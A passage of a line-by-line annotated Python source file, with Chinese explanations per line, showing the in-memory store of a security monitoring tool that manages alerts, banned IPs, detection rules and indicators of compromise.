| 405 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._rules: Dict[str, Dict[str, Any]] = {}` |
| 406 | 注释：解释下面或当前这段代码的设计意图。 | `        # key = f"{type}:{value_lower_for_domain_or_value_for_ip}"` |
| 407 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._iocs: Dict[str, Dict[str, Any]] = {}` |
| 408 | 注释：解释下面或当前这段代码的设计意图。 | `        # 可写运行时设置（进程内持久，重启丢失；Phase 8 接入持久化层）` |
| 409 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._settings: Dict[str, Any] = {}` |
| 410 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.stats: Dict[str, Any] = {` |
| 411 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "total_packets": 0,` |
| 412 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "total_threats": 0,` |
| 413 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "banned_ips": 0,` |
| 414 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "security_score": 100,` |
| 415 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "updated_at": _now_iso(),` |
| 416 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 417 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.banned_ips: Dict[str, str] = {}` |
| 418 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 419 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 告警 --------------------------------------------------------` |
| 420 | 函数定义：声明 `add_alert` 的输入、处理逻辑和返回结果。 | `    def add_alert(self, alert: Dict[str, Any]) -> Dict[str, Any]:` |
| 421 | 文档字符串：说明当前模块、类或函数的职责。 | `        """写入告警；补齐规范化字段并返回写入后的对象（含稳定 id）。` |
| 422 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 423 | 代码语句：参与当前文件的业务流程或数据处理。 | `        规范化：id / timestamp / level / status / title / summary / history；` |
| 424 | 代码语句：参与当前文件的业务流程或数据处理。 | `        非法 level 降级为 "low"，非法 status 强制为 "open"。` |
| 425 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 426 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        norm = dict(alert)` |
| 427 | 函数调用：执行已有函数/方法完成当前步骤。 | `        norm.setdefault("id", _uuid())` |
| 428 | 函数调用：执行已有函数/方法完成当前步骤。 | `        norm.setdefault("timestamp", _now_iso())` |
| 429 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        level = norm.get("level")` |
| 430 | 条件判断：满足条件时进入对应分支。 | `        if level not in ALERT_LEVELS:` |
| 431 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            level = "low"` |
| 432 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        norm["level"] = level` |
| 433 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        status = norm.get("status")` |
| 434 | 条件判断：满足条件时进入对应分支。 | `        if status not in ALERT_STATUSES:` |
| 435 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            status = "open"` |
| 436 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        norm["status"] = status` |
| 437 | 函数调用：执行已有函数/方法完成当前步骤。 | `        norm.setdefault("threat_type", "unknown")` |
| 438 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        norm["source_ip"] = str(norm.get("source_ip") or "").strip()` |
| 439 | 函数调用：执行已有函数/方法完成当前步骤。 | `        norm.setdefault("title", norm.get("details") or norm.get("message") or "未分类告警")` |
| 440 | 函数调用：执行已有函数/方法完成当前步骤。 | `        norm.setdefault("summary", norm.get("title"))` |
| 441 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        norm.setdefault("history", [{"status": status, "timestamp": norm["timestamp"]}])` |
| 442 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 443 | 注释：解释下面或当前这段代码的设计意图。 | `        # 若上游复用了同一 id，覆盖旧记录并从队列里去除` |
| 444 | 条件判断：满足条件时进入对应分支。 | `        if norm["id"] in self._by_id:` |
| 445 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._remove_by_id(norm["id"])` |
| 446 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 447 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._alerts.appendleft(norm)` |
| 448 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._by_id[norm["id"]] = norm` |
| 449 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 450 | 注释：解释下面或当前这段代码的设计意图。 | `        # deque 到达上限会从右端丢弃，保持 _by_id 同步` |
| 451 | 条件判断：满足条件时进入对应分支。 | `        if len(self._alerts) == self._MAX_ALERTS:` |
| 452 | 注释：解释下面或当前这段代码的设计意图。 | `            # 此时右端可能是刚被挤出的元素；由 deque 语义不便直接拿，` |
| 453 | 注释：解释下面或当前这段代码的设计意图。 | `            # 改用惰性清理：对 _by_id 的冗余键在每次查询时兜底一次` |
| 454 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._gc_by_id()` |
| 455 | 返回结果：把处理后的值交回调用方。 | `        return norm` |
| 456 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 457 | 函数定义：声明 `get_alert` 的输入、处理逻辑和返回结果。 | `    def get_alert(self, alert_id: str) -> Optional[Dict[str, Any]]:` |
| 458 | 返回结果：把处理后的值交回调用方。 | `        return self._by_id.get(alert_id)` |
| 459 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 460 | 函数定义：声明 `update_alert_status` 的输入、处理逻辑和返回结果。 | `    def update_alert_status(` |
| 461 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self, alert_id: str, new_status: str` |
| 462 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> Optional[Dict[str, Any]]:` |
| 463 | 条件判断：满足条件时进入对应分支。 | `        if new_status not in ALERT_STATUSES:` |
| 464 | 返回结果：把处理后的值交回调用方。 | `            return None` |
| 465 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert = self._by_id.get(alert_id)` |
| 466 | 条件判断：满足条件时进入对应分支。 | `        if not alert:` |
| 467 | 返回结果：把处理后的值交回调用方。 | `            return None` |
| 468 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert["status"] = new_status` |
| 469 | 函数调用：执行已有函数/方法完成当前步骤。 | `        alert.setdefault("history", []).append(` |
| 470 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {"status": new_status, "timestamp": _now_iso()}` |
| 471 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 472 | 返回结果：把处理后的值交回调用方。 | `        return alert` |
| 473 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 474 | 函数定义：声明 `distinct_threat_types` 的输入、处理逻辑和返回结果。 | `    def distinct_threat_types(self) -> List[str]:` |
| 475 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        seen: Dict[str, None] = {}` |
| 476 | 循环：逐个处理集合或迭代器中的元素。 | `        for item in self._alerts:` |
| 477 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            t = item.get("threat_type") or "unknown"` |
| 478 | 函数调用：执行已有函数/方法完成当前步骤。 | `            seen.setdefault(t, None)` |
| 479 | 返回结果：把处理后的值交回调用方。 | `        return sorted(seen.keys())` |
| 480 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 481 | 函数定义：声明 `query_alerts` 的输入、处理逻辑和返回结果。 | `    def query_alerts(` |
| 482 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 483 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 484 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        limit: int = 100,` |
| 485 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        offset: int = 0,` |
| 486 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        level: Optional[str] = None,` |
| 487 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threat_type: Optional[str] = None,` |
| 488 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        status: Optional[str] = None,` |
| 489 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        since: Optional[datetime] = None,` |
| 490 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        until: Optional[datetime] = None,` |
| 491 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        q: Optional[str] = None,` |
| 492 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> Tuple[List[Dict[str, Any]], int]:` |
| 493 | 文档字符串：说明当前模块、类或函数的职责。 | `        """返回 (分页后的结果, 过滤后的总数)。"""` |
| 494 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        needle = (q or "").strip().lower()` |
| 495 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        matched: List[Dict[str, Any]] = []` |
| 496 | 循环：逐个处理集合或迭代器中的元素。 | `        for item in self._alerts:` |
| 497 | 条件判断：满足条件时进入对应分支。 | `            if level and item.get("level") != level:` |
| 498 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 499 | 条件判断：满足条件时进入对应分支。 | `            if threat_type and item.get("threat_type") != threat_type:` |
| 500 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 501 | 条件判断：满足条件时进入对应分支。 | `            if status and item.get("status") != status:` |
| 502 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 503 | 条件判断：满足条件时进入对应分支。 | `            if since or until:` |
| 504 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                ts = _parse_iso(item.get("timestamp", ""))` |
| 505 | 条件判断：满足条件时进入对应分支。 | `                if since and (not ts or ts < since):` |
| 506 | 继续循环：跳过本轮剩余逻辑。 | `                    continue` |
| 507 | 条件判断：满足条件时进入对应分支。 | `                if until and (not ts or ts > until):` |
| 508 | 继续循环：跳过本轮剩余逻辑。 | `                    continue` |
| 509 | 条件判断：满足条件时进入对应分支。 | `            if needle:` |
| 510 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                hay = " ".join(` |
| 511 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    str(item.get(k, ""))` |
| 512 | 循环：逐个处理集合或迭代器中的元素。 | `                    for k in ("title", "summary", "threat_type", "source_ip", "dest_ip")` |
| 513 | 函数调用：执行已有函数/方法完成当前步骤。 | `                ).lower()` |
| 514 | 条件判断：满足条件时进入对应分支。 | `                if needle not in hay:` |
| 515 | 继续循环：跳过本轮剩余逻辑。 | `                    continue` |
| 516 | 函数调用：执行已有函数/方法完成当前步骤。 | `            matched.append(item)` |
| 517 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        total = len(matched)` |
| 518 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        sliced = matched[offset : offset + limit] if offset >= 0 else []` |
| 519 | 返回结果：把处理后的值交回调用方。 | `        return sliced, total` |
| 520 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 521 | 注释：解释下面或当前这段代码的设计意图。 | `    # 兼容旧调用点（dashboard.js 聚合）` |
| 522 | 函数定义：声明 `recent_alerts` 的输入、处理逻辑和返回结果。 | `    def recent_alerts(` |
| 523 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 524 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        limit: int = 100,` |
| 525 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        level: Optional[str] = None,` |
| 526 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threat_type: Optional[str] = None,` |
| 527 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        since: Optional[datetime] = None,` |
| 528 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> List[Dict[str, Any]]:` |
| 529 | 函数调用：执行已有函数/方法完成当前步骤。 | `        items, _ = self.query_alerts(` |
| 530 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            limit=limit, level=level, threat_type=threat_type, since=since` |
| 531 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 532 | 返回结果：把处理后的值交回调用方。 | `        return items` |
| 533 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 534 | 函数定义：声明 `_remove_by_id` 的输入、处理逻辑和返回结果。 | `    def _remove_by_id(self, alert_id: str) -> None:` |
| 535 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._by_id.pop(alert_id, None)` |
| 536 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 537 | 循环：逐个处理集合或迭代器中的元素。 | `            for idx, item in enumerate(self._alerts):` |
| 538 | 条件判断：满足条件时进入对应分支。 | `                if item.get("id") == alert_id:` |
| 539 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    del self._alerts[idx]` |
| 540 | 跳出循环：提前结束当前循环。 | `                    break` |
| 541 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except ValueError:` |
| 542 | 占位语句：保持语法完整但当前不执行操作。 | `            pass` |
| 543 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 544 | 函数定义：声明 `_gc_by_id` 的输入、处理逻辑和返回结果。 | `    def _gc_by_id(self) -> None:` |
| 545 | 文档字符串：说明当前模块、类或函数的职责。 | `        """清理已被 deque 挤出但仍在 _by_id 中的记录。"""` |
| 546 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alive = {item.get("id") for item in self._alerts}` |
| 547 | 循环：逐个处理集合或迭代器中的元素。 | `        for stale in [k for k in self._by_id if k not in alive]:` |
| 548 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._by_id.pop(stale, None)` |
| 549 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 550 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 封禁 IP -----------------------------------------------------` |
| 551 | 函数定义：声明 `ban_ip` 的输入、处理逻辑和返回结果。 | `    def ban_ip(self, ip: str, reason: str) -> None:` |
| 552 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.banned_ips[ip] = reason` |
| 553 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.stats["banned_ips"] = len(self.banned_ips)` |
| 554 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 555 | 函数定义：声明 `unban_ip` 的输入、处理逻辑和返回结果。 | `    def unban_ip(self, ip: str) -> bool:` |
| 556 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        removed = self.banned_ips.pop(ip, None) is not None` |
| 557 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.stats["banned_ips"] = len(self.banned_ips)` |
| 558 | 返回结果：把处理后的值交回调用方。 | `        return removed` |
| 559 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 560 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 检测规则 ----------------------------------------------------` |
| 561 | 函数定义：声明 `add_rule` 的输入、处理逻辑和返回结果。 | `    def add_rule(self, rule: Dict[str, Any]) -> Dict[str, Any]:` |
| 562 | 文档字符串：说明当前模块、类或函数的职责。 | `        """写入规则并返回规范化对象（含稳定 id / 时间戳 / 统计）。"""` |
| 563 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        now = _now_iso()` |
| 564 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        norm = dict(rule)` |
| 565 | 函数调用：执行已有函数/方法完成当前步骤。 | `        norm.setdefault("id", _uuid())` |
| 566 | 函数调用：执行已有函数/方法完成当前步骤。 | `        norm.setdefault("created_at", now)` |
| 567 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        norm["updated_at"] = now` |
| 568 | 函数调用：执行已有函数/方法完成当前步骤。 | `        norm.setdefault("hits", 0)` |
| 569 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._rules[norm["id"]] = norm` |
| 570 | 返回结果：把处理后的值交回调用方。 | `        return norm` |
| 571 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 572 | 函数定义：声明 `get_rule` 的输入、处理逻辑和返回结果。 | `    def get_rule(self, rule_id: str) -> Optional[Dict[str, Any]]:` |
| 573 | 返回结果：把处理后的值交回调用方。 | `        return self._rules.get(rule_id)` |
| 574 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 575 | 函数定义：声明 `update_rule` 的输入、处理逻辑和返回结果。 | `    def update_rule(` |
| 576 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self, rule_id: str, updates: Dict[str, Any]` |
| 577 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> Optional[Dict[str, Any]]:` |
| 578 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rule = self._rules.get(rule_id)` |
| 579 | 条件判断：满足条件时进入对应分支。 | `        if not rule:` |
| 580 | 返回结果：把处理后的值交回调用方。 | `            return None` |
| 581 | 循环：逐个处理集合或迭代器中的元素。 | `        for k, v in updates.items():` |
| 582 | 注释：解释下面或当前这段代码的设计意图。 | `            # id/created_at/hits 不可被外部直接覆盖` |
| 583 | 条件判断：满足条件时进入对应分支。 | `            if k in ("id", "created_at", "hits"):` |
| 584 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 585 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            rule[k] = v` |
| 586 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rule["updated_at"] = _now_iso()` |
| 587 | 返回结果：把处理后的值交回调用方。 | `        return rule` |
| 588 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 589 | 函数定义：声明 `delete_rule` 的输入、处理逻辑和返回结果。 | `    def delete_rule(self, rule_id: str) -> bool:` |
| 590 | 返回结果：把处理后的值交回调用方。 | `        return self._rules.pop(rule_id, None) is not None` |
| 591 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 592 | 函数定义：声明 `list_rules` 的输入、处理逻辑和返回结果。 | `    def list_rules(` |
| 593 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 594 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 595 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        type_: Optional[str] = None,` |
| 596 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        enabled: Optional[bool] = None,` |
| 597 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        q: Optional[str] = None,` |
| 598 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> List[Dict[str, Any]]:` |
| 599 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        needle = (q or "").strip().lower()` |
| 600 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result: List[Dict[str, Any]] = []` |
| 601 | 循环：逐个处理集合或迭代器中的元素。 | `        for rule in self._rules.values():` |
| 602 | 条件判断：满足条件时进入对应分支。 | `            if type_ and rule.get("type") != type_:` |
| 603 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 604 | 条件判断：满足条件时进入对应分支。 | `            if enabled is not None and bool(rule.get("enabled")) != enabled:` |
| 605 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 606 | 条件判断：满足条件时进入对应分支。 | `            if needle:` |
| 607 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                hay = " ".join(` |
| 608 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    str(rule.get(k, ""))` |
| 609 | 循环：逐个处理集合或迭代器中的元素。 | `                    for k in ("name", "description", "pattern", "type", "action")` |
| 610 | 函数调用：执行已有函数/方法完成当前步骤。 | `                ).lower()` |
| 611 | 条件判断：满足条件时进入对应分支。 | `                if needle not in hay:` |
| 612 | 继续循环：跳过本轮剩余逻辑。 | `                    continue` |
| 613 | 函数调用：执行已有函数/方法完成当前步骤。 | `            result.append(rule)` |
| 614 | 注释：解释下面或当前这段代码的设计意图。 | `        # 默认按 priority 升序、updated_at 降序（新改动靠前）` |
| 615 | 函数定义：声明 `_ts_key` 的输入、处理逻辑和返回结果。 | `        def _ts_key(r: Dict[str, Any]) -> float:` |
| 616 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ts = _parse_iso(r.get("updated_at"))` |
| 617 | 返回结果：把处理后的值交回调用方。 | `            return -ts.timestamp() if ts else 0.0` |
| 618 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 619 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result.sort(key=lambda r: (int(r.get("priority", 100)), _ts_key(r)))` |
| 620 | 返回结果：把处理后的值交回调用方。 | `        return result` |
| 621 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 622 | 函数定义：声明 `incr_rule_hits` 的输入、处理逻辑和返回结果。 | `    def incr_rule_hits(self, rule_id: str, delta: int = 1) -> None:` |
| 623 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rule = self._rules.get(rule_id)` |
| 624 | 条件判断：满足条件时进入对应分支。 | `        if not rule:` |
| 625 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 626 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rule["hits"] = int(rule.get("hits", 0)) + delta` |
| 627 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 628 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- IOC 注册表（富元数据） --------------------------------------` |
| 629 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 630 | 函数定义：声明 `_ioc_key` 的输入、处理逻辑和返回结果。 | `    def _ioc_key(ioc_type: str, value: str) -> str:` |
| 631 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type == "domain":` |
| 632 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            canonical = value.lower()` |
| 633 | 条件分支：前面条件不满足时继续判断。 | `        elif ioc_type == "file_hash":` |
| 634 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            canonical = value.strip().lower()` |
| 635 | 条件分支：前面条件不满足时继续判断。 | `        elif ioc_type == "cve":` |
| 636 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            canonical = value.strip().upper()` |
| 637 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 638 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            canonical = value.strip()` |
| 639 | 返回结果：把处理后的值交回调用方。 | `        return f"{ioc_type}:{canonical}"` |
| 640 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 641 | 函数定义：声明 `add_ioc` 的输入、处理逻辑和返回结果。 | `    def add_ioc(` |
| 642 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 643 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 644 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ioc_type: str,` |
| 645 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        value: str,` |
| 646 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        source: str = "manual",` |
| 647 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        reason: Optional[str] = None,` |
| 648 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        note: Optional[str] = None,` |
| 649 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        score: Optional[int] = None,` |
| 650 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> Dict[str, Any]:` |
| 651 | 文档字符串：说明当前模块、类或函数的职责。 | `        """新增或刷新一条 IOC（同 key 存在则合并 source/score/note，保持 added_at）。"""` |
| 652 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        key = self._ioc_key(ioc_type, value)` |
| 653 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        now = _now_iso()` |
| 654 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        existing = self._iocs.get(key)` |
| 655 | 条件判断：满足条件时进入对应分支。 | `        if existing:` |
| 656 | 条件判断：满足条件时进入对应分支。 | `            if source and source not in existing.get("sources", []):` |
| 657 | 函数调用：执行已有函数/方法完成当前步骤。 | `                existing.setdefault("sources", []).append(source)` |
| 658 | 条件判断：满足条件时进入对应分支。 | `            if reason:` |
| 659 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                existing["reason"] = reason` |
| 660 | 条件判断：满足条件时进入对应分支。 | `            if note is not None:` |
| 661 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                existing["note"] = note` |
| 662 | 条件判断：满足条件时进入对应分支。 | `            if score is not None:` |
| 663 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                existing["score"] = int(score)` |
| 664 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            existing["updated_at"] = now` |
| 665 | 返回结果：把处理后的值交回调用方。 | `            return existing` |
| 666 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        entry: Dict[str, Any] = {` |
| 667 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "id": _uuid(),` |
| 668 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "type": ioc_type,` |
| 669 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "value": value if ioc_type == "ip" else value.lower(),` |
| 670 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "sources": [source] if source else ["manual"],` |
| 671 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "reason": reason or "",` |
| 672 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "note": note or "",` |
| 673 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "score": int(score) if score is not None else None,` |
| 674 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "hits": 0,` |
| 675 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "added_at": now,` |
| 676 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "updated_at": now,` |
| 677 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 678 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._iocs[key] = entry` |
| 679 | 返回结果：把处理后的值交回调用方。 | `        return entry` |
| 680 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 681 | 函数定义：声明 `remove_ioc` 的输入、处理逻辑和返回结果。 | `    def remove_ioc(self, ioc_type: str, value: str) -> bool:` |
| 682 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        key = self._ioc_key(ioc_type, value)` |
| 683 | 返回结果：把处理后的值交回调用方。 | `        return self._iocs.pop(key, None) is not None` |
| 684 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 685 | 函数定义：声明 `get_ioc` 的输入、处理逻辑和返回结果。 | `    def get_ioc(self, ioc_type: str, value: str) -> Optional[Dict[str, Any]]:` |
| 686 | 返回结果：把处理后的值交回调用方。 | `        return self._iocs.get(self._ioc_key(ioc_type, value))` |
| 687 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 688 | 函数定义：声明 `incr_ioc_hit` 的输入、处理逻辑和返回结果。 | `    def incr_ioc_hit(self, ioc_type: str, value: str) -> None:` |
| 689 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        entry = self._iocs.get(self._ioc_key(ioc_type, value))` |
| 690 | 条件判断：满足条件时进入对应分支。 | `        if entry:` |
| 691 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            entry["hits"] = int(entry.get("hits", 0)) + 1` |
| 692 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            entry["updated_at"] = _now_iso()` |
| 693 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 694 | 函数定义：声明 `list_iocs` 的输入、处理逻辑和返回结果。 | `    def list_iocs(` |
| 695 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 696 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 697 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        type_: Optional[str] = None,` |
| 698 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        source: Optional[str] = None,` |
| 699 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        q: Optional[str] = None,` |
| 700 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> List[Dict[str, Any]]:` |
| 701 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        needle = (q or "").strip().lower()` |
| 702 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result: List[Dict[str, Any]] = []` |
| 703 | 循环：逐个处理集合或迭代器中的元素。 | `        for item in self._iocs.values():` |
| 704 | 条件判断：满足条件时进入对应分支。 | `            if type_ and item.get("type") != type_:` |
| 705 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 706 | 条件判断：满足条件时进入对应分支。 | `            if source and source not in item.get("sources", []):` |
